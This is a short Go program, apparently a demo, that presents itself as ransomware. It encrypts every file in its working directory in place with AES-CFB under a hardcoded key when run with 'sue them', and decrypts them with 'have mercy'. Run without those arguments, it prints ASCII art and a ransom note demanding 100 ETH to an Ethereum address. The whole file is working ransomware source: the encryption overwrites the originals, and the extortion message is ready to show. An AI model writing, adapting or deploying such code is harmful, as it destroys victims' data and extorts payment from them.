package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
)

func getContent() ([]string, error) {
	content := []string{}

	f, err := os.Open("./")
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	files, err := f.Readdir(0)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	for _, v := range files {
		if !v.IsDir() && v.Name() != "ransomware.go" && v.Name() != "ransomware" {
			content = append(content, v.Name())
		}
	}

	return content, nil
}

func encryptFile(key []byte, inputFile, outputFile string) error {
	plaintext, err := os.ReadFile(inputFile)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	return os.WriteFile(outputFile, ciphertext, 0644)
}

func decryptFile(key []byte, inputFile, outputFile string) error {
	ciphertext, err := os.ReadFile(inputFile)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	if len(ciphertext) < aes.BlockSize {
		return errors.New("Ciphertext is too short")
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)

	return os.WriteFile(outputFile, ciphertext, 0644)
}

func main() {

	args := os.Args

	key := []byte{100, 144, 120, 75, 115, 96, 78, 240, 232, 72, 169, 121, 196, 64, 125, 168, 192, 69, 136, 64, 154, 175, 186, 200, 110, 245, 27, 72, 216, 164, 225, 49}

	content, err := getContent()
	if err != nil {
		log.Fatal(err)
	}

	if len(args) == 3 {
		if args[1] == "sue" && args[2] == "them" {
			for _, v := range content {
				if err := encryptFile(key, v, v); err != nil {
					log.Fatal(err)
				}
			}

			fmt.Println("\033[32mFiles encrypted successfully.\033[0m")
			fmt.Println("\033[31mGood luck.\033[0m")
			return
		}

		if args[1] == "have" && args[2] == "mercy" {
			for _, v := range content {
				if err := decryptFile(key, v, v); err != nil {
					log.Fatal(err)
				}
			}

			fmt.Println("\033[32mFiles decrypted successfully.\033[0m")
			fmt.Println("\033[31mSee you later.\033[0m")
			return
		}
	}

	fmt.Printf("\033[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣀⣠⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⢛⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣠⣾⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⠿⠿⣍⠉⢹⣿⣿⡏⠛⠋⠹⣿⣿⡿⡁⢀⣾⢿⣿⣿⣷⣽⣷⡀⠀⠀⠀\n⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⠏⠋⠉⠀⠀⠀⠙⠿⣿⣿⣿⡶⣶⡞⢿⣿⣧⣿⠛⣷⣈⣿⣿⡟⠙⠻⣷⡀⠀⠀\n⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⣿⣧⣹⣷⣈⣷⣽⣿⣧⡿⠋⠀⠀⢰⠀⠀⢻⣷⠀⠀\n⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⢀⠀⠀⠀⢻⣿⣜⣿⣿⣭⣭⣹⣿⣿⣿⣦⣦⣴⣦⣿⣿⡀⣨⣿⡇⠀\n⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⠀⣠⠴⠛⠿⠃⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀\n⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠊⠀⠀⢀⠀⠀⠀⠀⠀⠀⢫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀\n⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧⣴⣿⣭⣄⠀⠀⠀⠀⠀⠉⠀⠋⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠷\n⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⢿⣥⣌⡛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⠀\n⠀⣿⣿⣿⣿⣿⣿⣿⣿⡟⣆⠉⠳⠬⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠃⢉⣿⣿⣿⣿⣿⣿⣿⣷⡿⠀\n⠀⢿⣿⣿⣿⣿⣿⣿⣿⣧⡘⣄⠀⠀⠀⠀⠀⠀⢀⣀⡠⠤⠤⡖⠠⡺⠋⠀⣸⣾⣿⣿⣿⣿⣿⣷⡿⠛⠀⠀\n⠀⠈⢿⣿⡟⢿⣿⣿⣿⣿⣿⣿⡯⢍⡀⠀⠲⣍⠉⠀⣀⡤⠊⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀\n⠀⠀⠀⠛⢿⡦⢹⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⣠⢾⣿⣿⣿⣿⣿⣯⣀⡀⢇⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠸⠈⢻⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⢀⡴⠚⠁⣸⣿⣿⣿⣿⣿⡈⠒⠄⠀⠁⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠁⠀⢀⡟⣹⣿⣾⣻⣿⣟⠿⣏⠳⢤⠴⠚⠁⢀⣠⣴⣿⡟⣿⢿⡮⢿⡓⠦⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢀⠀⠉⠴⡿⠿⠛⢡⡿⠁⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠉⠈⠻⠀⠉⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⢠⣾⣿⣿⣿⣶⣤⣄⣀⣀⣀⣀⣤⡤⠞⢿⣿⣿⣿⣿⣿⣿⠟⠛⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢀⣼⣿⡋⠁⠀⠀⠀⠘⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⣖⡉⠻⠿⠁⠀⠀⠀⠀⠀⠀⠈⠢⢄⡀⠀⠀⠀⠀⠀⠀⠀\n⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡈⠙⠷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣲⣦⣄⠀⠀⠀\n⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣿⡿⣿⣿⣿⣷⣤⡀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⡟⠈⠳⡄⠀\n\033[0m")

	fmt.Println("\033[31mUh oh!! Looks like you got hacked.\033[0m")
	fmt.Println("\033[31mRest assured. Just send 100 ETH to this account >>\033[0m \033[34m0xce8FC8a40B9A7263f22daf2995bCeFE4F38C839d\033[0m")
	fmt.Println("\033[31mThese files will be back in a bit >>\033[0m")
	fmt.Printf("\033[31m%v\033[0m\n", content)
}
